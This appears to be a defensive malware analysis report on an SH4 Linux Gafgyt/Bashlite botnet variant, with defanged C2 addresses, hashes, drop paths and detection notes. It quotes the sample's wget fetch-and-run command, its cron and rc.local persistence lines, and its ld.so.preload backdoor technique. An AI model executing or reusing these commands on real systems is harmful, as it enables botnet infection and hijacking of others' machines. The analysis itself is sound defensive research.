---
title: "Malware Analysis: Gafgyt/Bashlite variant (sh7f3a build) (ELF · elf · 80e18c8f)"
published: 2026-10-30
draft: false
description: "Malicious (medium confidence): Gafgyt/Bashlite variant (sh7f3a build) · botnet/backdoor/miner · difficulty hard · dynamic sandbox + static decompilation"
tags: ["Gafgyt/Bashlite 系变种", "botnet", "backdoor", "miner", "ELF"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-10-30-Gafgyt-Bashlite-系变种-sh7f3a-构建-80e18c8f"
---

> [!WARNING]
> **Verdict: malicious** · Family **Gafgyt/Bashlite variant (sh7f3a build)** (uncertain) · Confidence **medium**
> 
> Aliases: Bashlite, Qbot, Orimhhh, sh7f3a campaign
> 
> The SH4 Linux ELF contains a complete IoT-botnet feature set: hard-coded C2 addresses and server=/port=/arch= config, HTTP update download, systemd/cron/rc.local persistence, an ld.so.preload backdoor, killing competing botnets, tampering with hosts and iptables, Cryptonight mining, a multi-protocol DDoS command set, and anti-debugging/process masquerading. All of this logic is directly evidenced by strings, static structure and function cross-references.

## Overview

| Item | Content |
|:--|:--|
| Family | **Gafgyt/Bashlite variant (sh7f3a build)** · aliases Bashlite, Qbot, Orimhhh, sh7f3a campaign · _uncertain_ |
| Confidence | **medium** |
| Behaviour class | botnet · backdoor · miner |
| Difficulty | hard |
| First seen | 2026-10-28 06:23:42 |
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/80e18c8fb92657a2bf7d47ce66f0e7d9276c240475942fe0262d5619e1b8ae5d/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Built-in dual C2 addresses</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Parse server/port config</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Download update and run</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Register systemd service</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1543.002</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Plant cron and rc.local</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1053.003</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
</svg>

## Sample identity

| Item | Value |
|:--|:--|
| SHA-256 | `80e18c8fb92657a2bf7d47ce66f0e7d9276c240475942fe0262d5619e1b8ae5d` |
| MD5 | _not recorded_ |
| Size | 185,464 bytes (181.1 KB) |
| Type | ELF · `elf` |

## Behaviour analysis

**12** behaviours in total; each is tied to evidence, and all are statically recoverable.

### 1. Built-in dual C2 server addresses

`T1071.001` · Confidence **medium** · static

Two controller IPs are hard-coded in the read-only data segment: the default address at 0x426dbc (147.79.62[.]90) and the backup at 0x426e38 (83.168.69[.]95); the main logic function 0x40b46e and the command handler 0x40a932 load these two addresses respectively.

> **Evidence**: 0x40b46e references 0x426dbc; 0x40a932 references 0x426e38; default and server= config keys sit next to the strings
> 
> **Source**: `ref:97270bda90` · `ref:231cb7447f`

### 2. Parse server/port config

`T1071.001` · Confidence **medium** · static

Parses connection parameters in the server=/port=/arch= text format, falling back to the built-in default addresses on parse failure, forming C2 selection logic that can be overridden by delivered config.

> **Evidence**: 0x426c18 server= / 0x426c20 port= / 0x426c28 arch= consecutive strings, referenced by 0x40a932
> 
> **Source**: `ref:231cb7447f` · `ref:97270bda90`

### 3. Download update and execute

`T1105` · Confidence **high** · static

Uses the format string cd /tmp; wget -q hxxp://%s:%d/%s -O .b; chmod +x .b; ./.b & to fetch a new version from the remote and run it immediately, also triggered by the !update command.

> **Evidence**: 0x426c30 download command format string; 0x426c10 !update; both in the reference table of 0x40a932
> 
> **Source**: `ref:231cb7447f` · `ref:97270bda90`

### 4. Register systemd service persistence

`T1543.002` · Confidence **high** · static

Creates /etc/systemd/system/killer-helper.service and /etc/systemd/system/sys-network-helper.service with ExecStart pointing at /usr/lib/systemd/.system-helper or /dev/shm/.sh7f3a and Restart=always, then runs systemctl enable.

> **Evidence**: 0x25044 and 0x25e40 are complete unit templates; 0x40592c and 0x40824e reference the related paths
> 
> **Source**: `ref:58890434ac` · `ref:5cfc055289` · `ref:97270bda90`

### 5. Plant cron and rc.local

`T1053.003` · Confidence **high** · static

Writes per-minute watchdog commands into /etc/cron.d/killer-helper and /etc/cron.d/sys-network-helper, and appends an @reboot autostart entry to /etc/rc.local, ensuring recovery after reboot.

> **Evidence**: 0x2501c /etc/cron.d/killer-helper; 0x25d04 and 0x25d54 are the * * * * * and @reboot lines; 0x25164 @reboot root %s
> 
> **Source**: `ref:58890434ac` · `ref:5cfc055289` · `ref:97270bda90`

### 6. ld.so.preload preload backdoor

`T1574.006` · Confidence **high** · static

Writes /usr/lib/.sh7f3a.so into /etc/ld.so.preload; the shared library is compiled on the target from embedded C source via gcc -shared -fPIC -nostartfiles, and its constructor forks/setsid and execs /dev/shm/.sh7f3a once the lock file is available.

> **Evidence**: 0x25de8 /usr/lib/.sh7f3a.so and 0x25dfc /etc/ld.so.preload; embedded source at 0x26878 (with execl and flock logic); referenced by 0x4070ec/0x40824e
> 
> **Source**: `ref:58890434ac` · `ref:231cb7447f` · `ref:97270bda90`

### 7. Kill competing botnets

`T1489` · Confidence **high** · static

Maintains a list of competing families (mirai, gafgyt, qbot, bashlite, sora, owari, tsunami, condi, manji etc.), matches them by process name and command line and terminates them, writing /var/run/.killer.* state files for throttling.

> **Evidence**: 0x25358-0x253d0 family list; 0x25470 killer; 0x40592c references /var/run/.killer.lock etc.
> 
> **Source**: `ref:58890434ac` · `ref:70cadd3643` · `ref:97270bda90`

### 8. Tamper with hosts to block security sites

`T1562.001` · Confidence **high** · static

Writes 0.0.0[.]0 mappings inside the # BEGIN-sh7f3a / # END-sh7f3a block of /etc/hosts, blocking avast[.]com, virustotal[.]com, any.run, hybrid-analysis[.]com, urlhaus.abuse.ch and other security vendors and analysis platforms.

> **Evidence**: 0x25c8c /etc/hosts, 0x25c98 markers, 0x26360-0x2653c domain list; referenced by 0x40662e
> 
> **Source**: `ref:5cfc055289` · `ref:97270bda90`

### 9. Block scanner ports with iptables

`T1562.004` · Confidence **high** · static

Generates /var/run/.sh7f3a.ip.rules and invokes /usr/sbin/iptables and iptables-restore to DROP ports 2323, 5900, 5901, 5902, 5800, 5801, 3389, 2222 etc., and inserts a custom INPUT chain to resist scanners.

> **Evidence**: 0x259f0 ip.rules, 0x25a30 iptables, port strings from 0x26298; referenced by 0x40572e and 0x40592c
> 
> **Source**: `ref:5cfc055289` · `ref:97270bda90`

### 10. Deploy Cryptonight mining

`T1496` · Confidence **medium** · static

The sample embeds xmr/miner/cryptonight markers and miner-related logic, able to drop a Cryptonight mining module on a controlled host for resource hijacking.

> **Evidence**: 0x253d8 xmr, 0x253dc miner, 0x253e4 cryptonight; referenced near the read-only pointer table 0x424b84
> 
> **Source**: `ref:5cfc055289` · `ref:231cb7447f` · `ref:97270bda90`

### 11. DDoS command set

`T1498` · Confidence **high** · static

Implements attack types including udpplain, syn, ack, http, raknet, ssh, tcpstomp, minecraft, ovh and tcpbypass, and parses psize, srcport, usleep, msg, domain, path and method parameters, forming a remotely delivered DDoS platform.

> **Evidence**: 0x26cb4-0x26d40 attack types and parameter strings; parser function 0x40a932
> 
> **Source**: `ref:5cfc055289` · `ref:97270bda90`

### 12. Anti-debugging and process masquerading

`T1622` · Confidence **high** · static

Reads TracerPid from /proc/self/status and /proc/self/maps, sets oom_score_adj to -1000; uses [kworker/0:0] through [kworker/0:5] as disguised process names while retaining branches that detect debugger/honeypot environments.

> **Evidence**: 0x24c40 /proc/self/status, 0x24c54 TracerPid:, 0x25190 [kworker/0:0], 0x24c04 -1000; 0x4005f0 references the orimhhh disguise name
> 
> **Source**: `ref:58890434ac` · `ref:97270bda90` · `ref:a1ca6692a1`


## IOCs (defanged)

### Network

:::caution
**The real server side remains unverified**: the connections above were completed against a local controlled emulation service; the real C2 responses and delivered content are still unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| tcp | `147[.]79[.]62[.]90` | - | c2 | static | ⏳ not observed |
| tcp | `83[.]168[.]69[.]95` | - | c2 | static | ⏳ not observed |

### Host

**Mutex**

- `/var/run/.main.lock`
- `/var/run/.main.wd.lock`
- `/var/run/.killer.lock`
- `LK_sh7f3a`

**Drop paths**

- `/dev/shm/.sh7f3a`
- `/usr/lib/systemd/.system-helper`
- `/usr/lib/.sh7f3a.so`
- `/etc/ld.so.preload`
- `/etc/systemd/system/killer-helper.service`
- `/etc/systemd/system/sys-network-helper.service`
- `/etc/cron.d/killer-helper`
- `/etc/cron.d/sys-network-helper`
- `/var/run/.main.pid`
- `/var/run/.watchdog.pid`
- `/var/run/.watchdog2.pid`
- `/var/run/.stealth.pid`
- `/var/run/.defender.pid`
- `/var/run/.killer.pid`
- `/var/run/.killer.disabled`
- `/var/run/.sh7f3a.ip.rules`
- `/var/run/.sh7f3a.dis.list`
- `/var/run/.cleanup_now`
- `/etc/.hosts.tmp.XXXXXX`
- `/tmp/.%s_ps.c`

**Services**

- `killer-helper.service`
- `sys-network-helper.service`
- `defender-helper`
- `stealth-helper`

**Scheduled tasks**

- `* * * * * root test -f /dev/shm/.sh7f3a && /dev/shm/.sh7f3a >/dev/null 2>&1`
- `@reboot root test -f /dev/shm/.sh7f3a && /dev/shm/.sh7f3a >/dev/null 2>&1`
- `@reboot root <self>`

### Config

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `147[.]79[.]62[.]90;83[.]168[.]69[.]95` | yes | static |
| `c2_port` | `not statically determined (supplied by server=/port= config; fallback logic exists)` | yes | static |
| `config_format` | `server=<host>\nport=<port>\narch=<arch>` | yes | static |
| `campaign_id` | `sh7f3a / ORIMHHH_RESPAWN / orimhhh` | no | static |
| `encryption_algo` | `xorshift128 PRNG; also SHA-256 round constants and the TEA golden-ratio constant (use for C2 encryption unconfirmed)` | no | static |
| `miner_algo` | `cryptonight` | no | static |
| `install_paths` | `/dev/shm/.sh7f3a;/usr/lib/systemd/.system-helper;/usr/lib/.sh7f3a.so` | no | static |
| `evasion_hosts` | `avast[.]com;avg[.]com;virustotal[.]com;kaspersky[.]com;bitdefender[.]com;malwarebytes[.]com;any.run;hybrid-analysis[.]com;joesandbox[.]com;urlhaus.abuse.ch;threatcrowd[.]org;otx[.]alienvault[.]com` | no | static |

## Do not misjudge

:::important
The following conclusions are **easy to misjudge**; keep them in mind when citing this report.

- Do not classify it as ransomware or a data-theft stealer: no file-encryption or user-data exfiltration logic was found; its main functions are botnet, mining and DDoS.
- Do not treat egress to 147[.]79[.]62[.]90 and 83[.]168[.]69[.]95 as dynamically observed fact: both come from static strings and cross-references, real execution was not completed this run, and dynamic re-verification is needed.
- Do not misreport avast[.]com, virustotal[.]com and similar domains mapped to 0.0.0[.]0 in /etc/hosts as C2 or attacker infrastructure.
- Do not treat the abcdefghijklmnopqrstuvwxyz{|} string cluster as a flag; it is only part of an encoding/character table.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Unpacking | no |

**Limitations and pending verification**

1. The sample is SuperH4 architecture and cannot be loaded by any currently available local/sandbox execution environment; dynamic execution did not actually detonate, reproduced=false; C2 and config are statically recovered, pending_dynamic_verify=true.
2. The two C2 IPs sit in the read-only data segment and are referenced by 0x40b46e / 0x40a932, but no connect event has been observed; their ports and primary/backup roles need dynamic confirmation.
3. The main logic region (0x40a932, 0x40b46e) was not automatically recognised as standalone functions; conclusions rest on cross-validation of string addresses, instruction reference tables and adjacent function semantics, without decompiling that core function line by line.
4. The sha256 and file size were verified; the sample is not packed, no extractable stage-2 payload was found, and the update payload needs to be downloaded at runtime.

## Evidence index

<details>
<summary>Expand 12 tool evidence items</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ref:7831a7555b` | ELF structure parser | Confirmed ELF32 LE, e_machine=42(SH), EXEC, statically linked, no symbols/imports, entry 0x4010a0 |
| `ref:51cdf87b6d` | String extraction | Located read-only hard-coded IPs 147.79.62[.]90 (0x426dbc) and 83.168.69[.]95 (0x426e38) |
| `ref:5cfc055289` | String extraction | Extracted persistence, iptables, hosts blocking, config keys, attack types and C2-related strings |
| `ref:58890434ac` | String extraction | Extracted systemd/cron/rc.local/ld.so.preload, competing-family list and anti-debugging strings |
| `ref:70cadd3643` | String extraction | Extracted /proc, systemd, netcat, mirai/gafgyt/tsunami and other behaviour strings |
| `ref:231cb7447f` | String extraction | Offset-annotated read-only string view, confirming server=/port=/arch=, the download format string and the relative positions of the two IPs |
| `ref:13bf977205` | Cryptographic constant identification | Identified SHA-256 round constants (0x25738) and TEA delta (0x484) |
| `ref:81f028cb3e` | decompile.function | Decompiled 0x40dd20, confirmed as an xorshift128 PRNG |
| `ref:a1ca6692a1` | decompile.function | Decompiled entry 0x4010a0, confirmed it reaches the main logic via the libc startup routine |
| `ref:97270bda90` | evidence.record | Self-written script cross-references: maps C2, config keys, persistence, hosts/iptables, family-list strings to referencing functions 0x40b46e, 0x40a932, 0x40592c, 0x40662e, 0x4070ec, 0x40824e etc. |
| `ref:95235560c7` | decompile.symbols | The decompiler identified 481 functions with SuperH4 architecture, confirming the main logic region was not auto-split into functions |
| `ref:d29c5c094c` | Hash and fingerprint | Verified sha256=80e18c8f..., md5=7339dc5e..., size 185464 bytes |

</details>

---

_The sample behind this report is not public; IOCs are defanged. For security research only._
